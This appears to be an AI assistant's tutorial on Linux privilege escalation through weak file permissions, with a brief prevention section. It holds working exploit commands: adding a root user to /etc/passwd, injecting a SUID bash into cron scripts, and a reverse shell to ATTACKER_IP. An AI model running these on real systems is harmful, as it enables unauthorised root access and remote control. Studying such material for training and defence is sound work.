Weak file permissions = a low-privileged user can modify files that are executed by a high-privileged user (like root) → which leads to privilege escalation.


---

🔓 What Are Weak File Permissions?

In Linux every file has:

Owner   Group   Others
rwx     rwx     rwx

If sensitive files are writable by normal users, they can:

✅ inject commands
✅ replace content
✅ get root shell


---

🚨 Why This Is Dangerous

Because Linux often runs things automatically as root:

cron jobs

system services

startup scripts

SUID binaries


If you can modify what root executes → you become root.


---

⚠️ Case 1 — Writable /etc/passwd

📌 Normal Permission

-rw-r--r-- 1 root root /etc/passwd

❌ Misconfigured

-rw-rw-rw- 1 root root /etc/passwd

Exploit Flow

1️⃣ Check permission:

ls -l /etc/passwd

2️⃣ Generate password hash:

openssl passwd -1 hacker

3️⃣ Add new root user:

echo 'hacker:$1$xyz$abc:0:0:root:/root:/bin/bash' >> /etc/passwd

4️⃣ Switch user:

su hacker

💀 BOOM → root shell


---

⚠️ Case 2 — Writable Root Cron Script (Most Common in CTF & Real Systems)

Root Cron Job

* * * * * root /home/user/script.sh

Permission

-rwxrwxrwx 1 user user script.sh

🧠 Root runs it, but user owns it.


---

🧨 Exploit

Inject payload:

echo "cp /bin/bash /tmp/rootbash" >> script.sh
echo "chmod +s /tmp/rootbash" >> script.sh

Wait for cron to execute…

Then:

/tmp/rootbash -p

🔥 ROOT SHELL


---

⚠️ Case 3 — Writable Service File

Suppose:

/etc/systemd/system/app.service

is writable.

You change:

ExecStart=/tmp/shell.sh

Reload service → root executes your payload.


---

⚠️ Case 4 — Writable SUID Binary Dependency

If SUID program calls:

#!/bin/bash
backup.sh

And backup.sh is writable → inject shell.


---

🔍 How Attackers Find These

World writable files

find / -type f -perm -002 2>/dev/null

Writable by current user

find / -writable 2>/dev/null

Interesting targets

ls -l /etc/passwd
ls -l /etc/crontab
ls -l /etc/cron*


---

🛡️ Prevention (Blue Team View)

1️⃣ Principle of Least Privilege

Only give minimum required access.

Correct:

-rwxr-x--- root root script.sh

❌ Never:

777


---

2️⃣ Restrict Write Permissions

Use:

chmod 644 file
chmod 750 script.sh


---

3️⃣ Proper Ownership

chown root:root script.sh


---

4️⃣ Regular Audits

Find world-writable files

find / -type f -perm -002

Find writable cron files

ls -la /etc/cron*


---

🧠 Real-World PrivEsc Mindset

When you get a shell as low user:

You ask:

> ❓ What does root execute that I can modify?



Check:

cron jobs

systemd services

backup scripts

logrotate scripts

writable config files


That’s the real game.


---

🔥 Quick Real CTF Style Example

Low shell as www-data

cat /etc/crontab

Output:

* * * * * root /opt/backup.sh

Check:

ls -l /opt/backup.sh

Result:

-rwxrwxrwx 1 www-data www-data backup.sh

Exploit:

echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh

Wait 1 minute…

💀 ROOT REVERSE SHELL


---

⭐ Key Takeaway

Weak permissions = low user controls something executed by root

That is one of the most common real-world Linux privilege escalation vectors.


---

⚡ If You Want — Next Level

I can give you:

✅ 10 real privilege escalation lab scenarios
✅ automated enumeration tools (LinPEAS, LES, LinEnum)
✅ checklist for OSCP / CRTP / CTF

Just say:

> “Give me weak permission priv-esc methodology” 😄